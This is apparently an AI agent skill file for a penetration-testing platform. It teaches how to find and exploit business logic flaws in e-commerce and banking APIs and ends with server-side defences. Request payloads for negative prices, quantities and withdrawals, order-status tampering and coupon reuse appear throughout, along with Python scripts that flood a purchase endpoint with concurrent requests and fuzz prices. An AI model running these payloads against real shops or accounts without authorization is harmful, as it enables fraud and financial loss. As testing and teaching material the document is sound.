---
name: business-logic-testing
description: Professional techniques and methodology for business logic vulnerability testing
version: 1.0.0
---

# Business Logic Vulnerability Testing

## Overview

Business logic vulnerabilities are design flaws in an application's business workflows that can lead to unauthorized operations, data tampering, financial loss, and more. This skill covers how to detect, exploit, and defend against business logic vulnerabilities.

## Vulnerability Types

### 1. Workflow Bypass

**Skipping validation steps:**
- Accessing the final step directly
- Reordering steps
- Repeating steps

### 2. Price Manipulation

**Negative prices:**
- Submitting negative amounts
- Causing account balances to increase

**Price tampering:**
- Modifying frontend prices
- Modifying prices in API requests

### 3. Quantity Limit Bypass

**Negative quantities:**
- Submitting negative values
- May increase inventory

**Exceeding limits:**
- Modifying quantity limits
- Bypassing via bulk operations

### 4. Race Conditions

**Concurrent requests:**
- Sending multiple requests simultaneously
- Bypassing per-request limits

### 5. State Manipulation

**State rollback:**
- Changing a completed order back to pending payment
- Modifying order status

## Testing Methodology

### 1. Workflow Analysis

**Identify business flows:**
- Registration flow
- Purchase flow
- Withdrawal flow
- Approval flow

**Test step skipping:**
```
Normal flow: step1 -> step2 -> step3
Test: access step3 directly
Test: step1 -> step3 (skip step2)
```

### 2. Parameter Tampering

**Modifying key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # change to 0.01
}
```

**Negative value testing:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency Testing

**Sending simultaneous requests:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# Send 10 requests concurrently
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State Modification

**Modifying order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # change to completed
}
```

**Rolling back status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # roll back from completed to pending payment
}
```

## Exploitation Techniques

### Price Manipulation

**Negative prices:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modifying the frontend price:**
```javascript
// Frontend code
const price = 100.00;

// Change to
const price = 0.01;
```

**Modifying the API price:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # original price 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity Limit Bypass

**Negative quantities:**
```json
{
  "product_id": 123,
  "quantity": -10  # may increase inventory
}
```

**Exceeding limits:**
```json
{
  "product_id": 123,
  "quantity": 999999  # exceeds the per-purchase limit
}
```

### Coupon Abuse

**Repeated use:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupon
```

**Inactive coupons:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # use an expired coupon
  "items": [...]
}
```

### Withdrawal Vulnerabilities

**Negative withdrawals:**
```json
{
  "amount": -1000.00  # may increase the account balance
}
```

**Exceeding the balance:**
```json
{
  "amount": 999999.00  # exceeds the account balance
}
```

### Race Conditions

**Concurrent purchases:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Flash sale, concurrent requests
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass Techniques

### Frontend Validation Bypass

**Calling the API directly:**
- Bypass frontend JavaScript validation
- Send API requests directly

**Modifying requests:**
- Intercept with Burp Suite
- Modify parameters and resend

### Status Code Analysis

**Observe responses:**
- 200 OK - likely succeeded
- 400 Bad Request - invalid parameters
- 403 Forbidden - insufficient permissions
- 500 Internal Server Error - server error

### Error Message Exploitation

**Extracting information from error messages:**
```
Error: "Insufficient balance, current balance: 100.00"
-> The account balance can be inferred
```

## Tool Usage

### Burp Suite

**Using Repeater:**
1. Intercept the business request
2. Modify key parameters
3. Observe the response

**Using Intruder:**
1. Mark payload positions
2. Supply a payload list
3. Test in bulk

### Custom Scripts

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and Reporting

### Verification Steps

1. Confirm the business logic restrictions can be bypassed
2. Verify unauthorized operations can be performed
3. Assess impact (financial loss, data tampering, etc.)
4. Document the complete POC
5. Record confirmed vulnerabilities in the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities in this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation advice

### Report Essentials

- Vulnerability location and business flow
- Unauthorized operations that can be performed
- Complete exploitation steps and PoC
- Remediation advice (server-side validation, business rule checks, etc.)

## Protective Measures

### Recommendations

1. **Server-Side Validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Fetch the real price from the database
       real_price = db.get_product_price(product_id)
       
       # Validate the price
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # Validate the quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # Process the purchase
       process_order(product_id, quantity, real_price)
   ```

2. **State Machine Validation**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency Control**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # Check the order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # Process the order
           process(order)
   ```

4. **Business Rule Validation**
   ```python
   def validate_business_rules(order):
       # Validate quantity limits
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # Validate the price range
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # Validate stock
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit Logging**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Notes

- Test only in authorized environments
- Avoid real impact on the business
- Be aware of differences between business flows
- Mind data consistency while testing
